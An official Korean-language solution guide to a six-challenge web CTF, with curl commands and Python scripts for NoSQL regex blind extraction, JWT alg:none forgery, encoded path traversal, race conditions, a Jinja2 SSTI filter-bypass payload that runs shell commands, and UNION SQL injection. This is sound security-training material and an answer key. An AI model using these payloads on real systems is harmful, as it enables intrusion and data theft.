# IntraCore CTF — 공식 풀이 가이드

> 총 6문제 / 2,250pt / 난이도: 최상급
> 참고: 모든 FLAG는 HMAC 기반 동적 생성으로 사용자마다 다릅니다.

---

## Ch1: 직원 정보 열람 (250pt)

**카테고리:** HR
**취약점:** NoSQL-style Operator Injection → `$regex` Blind Extraction

### 개요

직원 검색 API(`POST /directory/search`)가 JSON body의 값이 dict일 때 MongoDB 스타일 연산자(`$ne`, `$regex`, `$gt` 등)로 해석합니다. 이 API에는 `active` 필터가 적용되지 않아 퇴직자(active=0) 데이터에 접근할 수 있으며, `$regex` 연산자를 boolean oracle로 활용하여 응답에 포함되지 않는 `private_note` 필드를 한 글자씩 추출할 수 있습니다.

### 풀이

#### 1단계: 검색 API 발견 및 연산자 확인

`/directory/` 페이지에서 검색 API 안내를 확인합니다. 빈 JSON을 보내면 지원 연산자 목록이 반환됩니다.

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{}' \
  http://target/directory/search
```

응답:
```json
{
  "error": "검색 조건을 JSON으로 입력하세요.",
  "supported_operators": ["$ne", "$regex", "$gt", "$lt", "$exists"],
  "searchable_fields": ["active", "bio", "department", "email", ...]
}
```

#### 2단계: `$ne` 연산자로 숨겨진 데이터 발견

`$ne`(not equal)로 전체 결과를 조회합니다.

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"name":{"$ne":""}}' \
  http://target/directory/search
```

응답에 5명이 반환되지만 일반 목록에는 4명만 표시됩니다. `active: false`인 user_id=5 "송레거시"(퇴직자)를 발견합니다.

#### 3단계: 퇴직자 접근 제한 확인

`/directory/5`에 접근하면 "퇴직 처리되었습니다" 메시지만 표시되고 `private_note`는 노출되지 않습니다. 검색 API 응답에도 `private_note`는 포함되지 않습니다.

#### 4단계: `$regex` Blind Oracle 구축

`private_note` 필드에 `$regex` 연산자를 적용하면, 매칭 시 결과가 반환되고(count > 0) 미매칭 시 빈 배열이 반환됩니다. 이 차이를 boolean oracle로 활용합니다.

```bash
# 첫 글자가 'R'인지 확인
curl -X POST -H "Content-Type: application/json" \
  -d '{"user_id":5, "private_note":{"$regex":"^R"}}' \
  http://target/directory/search
# → count: 1 (매칭)

# 첫 글자가 'A'인지 확인
curl -X POST -H "Content-Type: application/json" \
  -d '{"user_id":5, "private_note":{"$regex":"^A"}}' \
  http://target/directory/search
# → count: 0 (미매칭)
```

#### 5단계: 자동 추출 스크립트

```python
import requests, string

url = "http://target/directory/search"
cookies = {"session": "YOUR_SESSION_COOKIE"}
charset = string.ascii_letters + string.digits + "+/="
extracted = ""

while True:
    found = False
    for c in charset:
        payload = {"user_id": 5, "private_note": {"$regex": f"^{extracted}{c}"}}
        r = requests.post(url, json=payload, cookies=cookies)
        if r.json()["count"] > 0:
            extracted += c
            print(f"[+] {extracted}")
            found = True
            break
    if not found:
        break

print(f"\n[*] Extracted: {extracted}")
```

#### 6단계: Base64 디코딩

추출된 문자열은 Base64 인코딩되어 있습니다.

```python
import base64
decoded = base64.b64decode(extracted).decode()
# → "FLAG_MARKER:employee_directory_leak"
```

이 마커 문자열을 확인한 후 `/submit-flag`에서 동적 FLAG를 제출합니다.

> **핵심 기법:** NoSQL-style Operator Injection, Boolean-based Blind Extraction, Base64 Encoding

---

## Ch2: 복구 티켓 검토 (300pt)

**카테고리:** IT
**취약점:** JWT `alg:none` Forgery → 권한 상승 → XOR 암호화 메모 복호화

### 개요

인증 시스템이 JWT 쿠키(`ic_token`)를 사용하며, `alg:none`을 허용하는 취약점이 있습니다. JWT의 `role`을 `admin`으로 변조하면 관리자 전용 기능(티켓 재오픈)에 접근할 수 있습니다. 재오픈된 티켓의 내부 메모는 XOR 암호화되어 있으며, 키 파생 방식이 UI에 명시되어 있습니다.

### 풀이

#### 1단계: JWT 쿠키 분석

로그인 후 브라우저 개발자 도구에서 `ic_token` 쿠키를 확인합니다. JWT 구조(header.payload.signature)를 Base64URL 디코딩합니다.

```python
import base64, json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo2LCJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoiZW1wbG95ZWUifQ.XXXXX"
parts = token.split(".")
header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
print(header)   # {"alg": "HS256", "typ": "JWT"}
print(payload)  # {"user_id": 6, "username": "test", "role": "employee", ...}
```

#### 2단계: 재오픈 시도 → 권한 부족 확인

`/tickets/2` (닫힌 티켓)에서 재오픈을 시도하면 "admin 권한이 필요합니다" 에러가 반환됩니다.

```json
{"error": "admin 권한이 필요합니다.", "your_role": "employee", "hint": "인증 토큰의 권한 정보를 확인하세요."}
```

#### 3단계: JWT `alg:none` 변조

`alg`를 `none`으로, `role`을 `admin`으로 변경하고 서명을 빈 문자열로 설정합니다.

```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()

header = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({"user_id": 6, "username": "test", "role": "admin"})
forged = f"{header}.{payload}."  # 서명 없음
print(forged)
```

#### 4단계: 변조 토큰으로 재오픈

```bash
curl -X POST -b "ic_token=FORGED_TOKEN" \
  http://target/tickets/2/reopen
```

재오픈 성공 후 `/tickets/2` 접근 시 "내부 메모 (암호화됨)" 섹션에 hex 문자열이 표시됩니다.

#### 5단계: XOR 복호화

페이지에 명시된 암호화 정책: "키 파생: 티켓 고유 식별자의 SHA256 해시 앞 16바이트"

```python
import hashlib

encrypted_hex = "..."  # 페이지에서 복사
encrypted = bytes.fromhex(encrypted_hex)
key = hashlib.sha256(b"2").hexdigest()[:16].encode()  # ticket_id=2

decrypted = bytes(e ^ key[i % len(key)] for i, e in enumerate(encrypted))
print(decrypted.decode())  # → "복구 작업 완료. 백업 키: FLAG{ticket_ghost_xxxxx} ..."
```

> **핵심 기법:** JWT `alg:none` Forgery (Intigriti 2025 스타일), XOR Symmetric Decryption

---

## Ch3: 문서 보관소 점검 (350pt)

**카테고리:** IT
**취약점:** Path Traversal 필터 우회 (URL 인코딩) → XOR 복호화 → Fragment Assembly

### 개요

문서 보관소의 다운로드 기능(`/archive/download?name=`)이 `../` 리터럴을 차단하지만, raw query string만 검사하므로 URL 인코딩(`%2e%2e%2f`)으로 우회할 수 있습니다. 비공개 영역에서 XOR 암호화된 조각 파일 3개를 수집하여 복호화 및 조합 후 `/archive/assemble`에 제출합니다.

### 풀이

#### 1단계: 공개 문서에서 보관소 구조 파악

`onboarding_guide.txt`를 다운로드하면 "보관소는 public/(공개)과 private/(제한) 영역으로 구분됩니다"라는 정보를 얻습니다.

#### 2단계: Path Traversal 시도 → 필터 발견

```bash
curl "http://target/archive/download?name=../private"
# → {"error":"경로에 허용되지 않는 문자열이 포함되어 있습니다.","blocked":"../","filter":"literal_sequence_check"}
```

에러 메시지가 `../`라는 리터럴만 차단함을 명시합니다.

#### 3단계: URL 인코딩으로 우회

`../`를 `%2e%2e%2f`로 인코딩하면 raw query string에 `../`가 없으므로 필터를 통과합니다. Flask는 자동 디코딩하여 실제 경로를 `../private`로 해석합니다.

```bash
curl "http://target/archive/download?name=%2e%2e%2fprivate"
```

응답:
```
Directory listing: ../private

board_minutes.txt
fragments
```

#### 4단계: board_minutes.txt에서 복호화 키 추출

```bash
curl "http://target/archive/download?name=%2e%2e%2fprivate%2fboard_minutes.txt"
```

내용에서 두 가지 핵심 정보를 추출합니다:
- "기밀 문서 조각은 fragments/ 하위에 분산 보관됨"
- "문서 분류 코드: **IC-SEC-2026-A7B3**"

#### 5단계: 조각 파일 다운로드

```bash
curl "http://target/archive/download?name=%2e%2e%2fprivate%2ffragments"
# → frag_01.enc, frag_02.enc, frag_03.enc

curl -o frag_01.enc "http://target/archive/download?name=%2e%2e%2fprivate%2ffragments%2ffrag_01.enc"
curl -o frag_02.enc "http://target/archive/download?name=%2e%2e%2fprivate%2ffragments%2ffrag_02.enc"
curl -o frag_03.enc "http://target/archive/download?name=%2e%2e%2fprivate%2ffragments%2ffrag_03.enc"
```

#### 6단계: XOR 복호화 → 조합

분류 코드 `IC-SEC-2026-A7B3`를 XOR 키로 사용하여 각 조각을 복호화합니다.

```python
key = b"IC-SEC-2026-A7B3"

for i in range(1, 4):
    with open(f"frag_{i:02d}.enc", "rb") as f:
        data = f.read()
    decrypted = bytes(d ^ key[j % len(key)] for j, d in enumerate(data))
    print(f"Fragment {i}: {decrypted.decode()}")
# → ARCHIVE, :VERIFIED, :GRANTED
# 조합: ARCHIVE:VERIFIED:GRANTED
```

#### 7단계: `/archive/assemble`에 제출

```bash
curl -X POST -d "verification_code=ARCHIVE:VERIFIED:GRANTED&classification=IC-SEC-2026-A7B3" \
  http://target/archive/assemble
# → {"success":true, "flag":"FLAG{archive_smuggler_xxxxx}"}
```

> **핵심 기법:** URL Encoding Bypass (HITCON 2025 IMGC0NV 스타일), Directory Listing, Cross-file Key Extraction, XOR Decryption, Fragment Assembly

---

## Ch4: 정산 시스템 감사 (400pt)

**카테고리:** Finance
**취약점:** TOCTOU Race Condition → 불가능한 상태 → Anomaly Detection

### 개요

급여 정산의 3단계 다중 승인 시스템에서 "같은 사용자 중복 승인 불가" 검사가 non-atomic(SELECT → 체크 → sleep(0.1초) → UPDATE)하게 구현되어 있습니다. 동시에 여러 승인 요청을 보내면 race window 내에서 모든 요청이 빈 체인을 읽어 중복 체크를 우회합니다.

### 풀이

#### 1단계: 승인 시도 → 다중 결재 정책 확인

```bash
curl -X POST -d "request_id=1" http://target/finance/approve
# → {"success":true, "approve_count":1, "required":3, "message":"1/3 단계 승인 완료"}

curl -X POST -d "request_id=1" http://target/finance/approve
# → {"error":"동일 사용자의 연속 승인은 불가합니다.", "processing_time_ms":50, ...}
```

#### 2단계: Race Condition 단서 파악

에러 응답의 `"processing_time_ms": 50`과 정책 문구 "동시 접근 시 예기치 않은 동작이 발생할 수 있습니다"에서 non-atomic 처리를 추론합니다.

#### 3단계: 동시 요청으로 Race Condition 발동

DB를 초기화(또는 새 payroll request 사용)한 후, 5개 이상의 승인 요청을 **동시에** 전송합니다.

```python
import urllib.request, urllib.parse, http.cookiejar, threading, json

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# 로그인 (쿠키 획득)
# ...

results = []
def approve():
    try:
        data = urllib.parse.urlencode({"request_id": 1}).encode()
        r = opener.open("http://target/finance/approve", data)
        results.append(json.loads(r.read()))
    except Exception as e:
        pass

# 동시 5개 요청
threads = [threading.Thread(target=approve) for _ in range(5)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# 모든 요청이 중복 체크를 우회하여 성공
print(f"Successful: {sum(1 for r in results if r.get('success'))}")
```

#### 4단계: Anomaly 스냅샷 생성

```bash
curl -X POST -d "request_id=1" http://target/finance/snapshot
```

같은 사용자가 3회 이상 승인한 이상 상태가 감지되어 FLAG가 포함된 JSON이 반환됩니다:

```json
{
  "anomaly": true,
  "integrity_check": "same_user_multi_approve",
  "flag": "FLAG{payroll_race_xxxxx}",
  "detail": "TOCTOU violation: same user approved multiple times via race condition"
}
```

> **핵심 기법:** TOCTOU Race Condition (HITCON 2025 concurrent-safe-db 스타일), Concurrent HTTP Requests

---

## Ch5: 신고 리뷰 파이프라인 (450pt)

**카테고리:** Compliance
**취약점:** SSTI + `attr()` + `\x5f` Hex Escape 필터 우회 → RCE

### 개요

신고 시스템의 미리보기 기능이 `render_template_string()`으로 사용자 입력을 렌더링하여 SSTI가 발생합니다. 블랙리스트(`.`, `__`, `[]`, `+`, 주요 키워드)가 적용되지만, Jinja2의 `attr()` 필터와 hex escape(`\x5f`)로 우회하여 Python internals에 접근, 파일 읽기/명령 실행이 가능합니다.

### 풀이

#### 1단계: SSTI 확인

신고 내용에 `{{ 7*7 }}`을 입력하고 미리보기를 확인합니다. `49`가 표시되면 SSTI가 활성화된 것입니다.

#### 2단계: 블랙리스트 분석

`{{ config }}`를 입력하면 저장이 거부되며 전체 블랙리스트가 반환됩니다:

```
금지된 표현이 포함되어 있습니다. 차단 목록: ., __, [, ], +, class, subclasses, globals, builtins, import, config, review_flag, os, eval, exec
```

**차단:** `.`(dot), `__`(더블 언더스코어), `[]`(대괄호), 주요 키워드
**허용:** 단일 `_`, `|`(파이프), `attr()`, `{%`, `%}`, `(`, `)`, `\x5f`(hex escape)

#### 3단계: `flag_path` 변수로 플래그 파일 위치 파악

`flag_path`에는 `.`이나 `__`가 없으므로 블랙리스트를 통과합니다.

```
{{ flag_path }}
```

미리보기 결과: `C:\...\instance\flags\report_flag_6.txt` (사용자 ID에 따라 다름)

#### 4단계: `attr()` + `\x5f` 체인으로 RCE

picoCTF 2025 SSTI2 기법을 적용합니다. `.`은 `|attr()`으로, `__`는 `\x5f\x5f`로 우회합니다.

```
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('subprocess')|attr('check_output')('type C:\\path\\to\\report_flag_6')|attr('decode')() }}
```

> **참고:** Windows 환경에서는 `type` 명령을, Linux에서는 `cat` 명령을 사용합니다. 파일 경로는 3단계에서 얻은 값을 사용합니다.

#### 간편 풀이 (flag_path 활용)

RCE까지 가지 않아도, 렌더 컨텍스트에 `flag_path`와 함께 `review_flag` 변수도 존재합니다. `review_flag`는 블랙리스트에 있지만, Jinja2의 문자열 연결로 우회할 수 있습니다:

```
{% set a='review' %}{% set b='_flag' %}{% set c=a~b %}{% print self._TemplateReference__context[c] %}
```

단, `__`가 차단되므로 이 경로는 불가합니다. 최종적으로 `attr()` + `\x5f` RCE가 의도된 풀이입니다.

> **핵심 기법:** Jinja2 SSTI, `attr()` Filter Bypass, `\x5f` Hex Escape (picoCTF 2025 SSTI2, CODEGATE 2025 Censored Board 스타일)

---

## Ch6: 레거시 검증기 감사 (500pt)

**카테고리:** Security
**취약점:** Known-plaintext XOR Recovery → SQL Injection → Timed Challenge-Response

### 개요

XOR 기반 서명 시스템에서 nonce가 공개 샘플 테이블에서 숨겨져 있지만, known-plaintext attack으로 복원할 수 있습니다. 비공개 샘플의 nonce는 검증 로그 검색 기능의 SQL Injection으로 추출합니다. 최종적으로 서버가 발급하는 시간 제한(60초) 챌린지에 대한 유효한 서명을 생성하여 제출합니다.

### 풀이

#### 1단계: 공개 샘플에서 nonce 복원 (Known-plaintext Attack)

페이지에 표시된 XOR 알고리즘: `signature[i] = message[i] XOR nonce[i % nonce_len]`

이를 역산하면: `nonce[i % nonce_len] = message[i] XOR signature[i]`

```python
msg = b"hello:world:test"
sig = bytes.fromhex("c1d0a1e080974f7dc5d6a0e385904079")  # Sample-A의 signature

nonce = bytes(m ^ s for m, s in zip(msg[:8], sig[:8]))  # nonce 길이 8바이트
print(f"Recovered nonce: {nonce.hex()}")  # → a3b1c2d4e5f60718
```

두 번째 샘플(Sample-B)에서도 같은 nonce가 나오면 nonce 재사용이 확인됩니다.

#### 2단계: 검증 로그 SQL Injection으로 비공개 nonce 추출

검증 로그 검색(`/verify/logs?from=&to=`) 기능의 날짜 파라미터가 SQL에 직접 삽입됩니다.

```bash
# SQL 에러 유발
curl "http://target/verify/logs?from='&to=x"
# → {"error": "쿼리 오류: ..."}

# UNION 기반 추출: 비공개 샘플의 nonce
curl "http://target/verify/logs?from=' UNION SELECT nonce,1,1,1,1 FROM verification_samples--&to=x"
```

응답에서 nonce_group=2의 nonce(`f1e2d3c4b5a69078`)를 추출합니다.

#### 3단계: 챌린지 발급

```bash
curl http://target/verify/challenge
```

응답:
```json
{
  "message": "verify:audit:1776071234",
  "nonce_group": 2,
  "expires_in": 60
}
```

#### 4단계: 서명 계산 (60초 내)

챌린지의 `nonce_group`에 해당하는 nonce로 서명을 생성합니다.

```python
import time

challenge_msg = "verify:audit:1776071234"
nonce_group = 2

# nonce_group에 따라 올바른 nonce 선택
nonces = {
    1: bytes.fromhex("a3b1c2d4e5f60718"),
    2: bytes.fromhex("f1e2d3c4b5a69078"),
}
nonce = nonces[nonce_group]
msg_bytes = challenge_msg.encode()

sig = bytes(msg_bytes[i] ^ nonce[i % len(nonce)] for i in range(len(msg_bytes)))
print(f"Signature: {sig.hex()}")
```

#### 5단계: 60초 내 제출

```bash
curl -X POST \
  -d "message=verify:audit:1776071234&signature=COMPUTED_HEX" \
  http://target/verify/
# → {"success":true, "flag":"FLAG{nonce_museum_xxxxx}"}
```

#### 자동화 스크립트 (전체 풀이)

```python
import urllib.request, urllib.parse, json, http.cookiejar

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
base = "http://target"

# 로그인 (생략)

# 1. 챌린지 발급
r = json.loads(opener.open(f"{base}/verify/challenge").read())
msg = r["message"]
ng = r["nonce_group"]

# 2. SQLi로 nonce 추출 (이미 알고 있다면 생략)
nonces = {1: "a3b1c2d4e5f60718", 2: "f1e2d3c4b5a69078"}
nonce = bytes.fromhex(nonces[ng])

# 3. 서명 계산
sig = bytes(msg.encode()[i] ^ nonce[i % len(nonce)] for i in range(len(msg)))

# 4. 제출
data = urllib.parse.urlencode({"message": msg, "signature": sig.hex()}).encode()
result = json.loads(opener.open(f"{base}/verify/", data).read())
print(result["flag"])
```

> **핵심 기법:** Known-plaintext XOR Recovery, Union-based SQL Injection, Timed Challenge-Response

---

## 요약 — 기법 매트릭스

| 문제 | 배점 | 주요 기법 | 참고 대회 |
|------|------|----------|----------|
| Ch1 직원 정보 | 250 | NoSQL Operator Injection, $regex Blind, Base64 | PortSwigger NoSQL Labs 2025-2026 |
| Ch2 티켓 복구 | 300 | JWT alg:none Forgery, XOR Decryption | Intigriti 11/2025 AquaCommerce |
| Ch3 문서 보관소 | 350 | URL Encoding Path Traversal, XOR, Fragment Assembly | HITCON 2025 IMGC0NV |
| Ch4 정산 감사 | 400 | TOCTOU Race Condition, Concurrent Requests | HITCON 2025 concurrent-safe-db, CODEGATE 2025 |
| Ch5 신고 파이프라인 | 450 | SSTI, attr()+\x5f Bypass, RCE | picoCTF 2025 SSTI2, CODEGATE 2025 Censored Board |
| Ch6 레거시 검증기 | 500 | Known-plaintext XOR, SQLi, Timed Challenge | HITCON crypto, real nonce-reuse attacks |
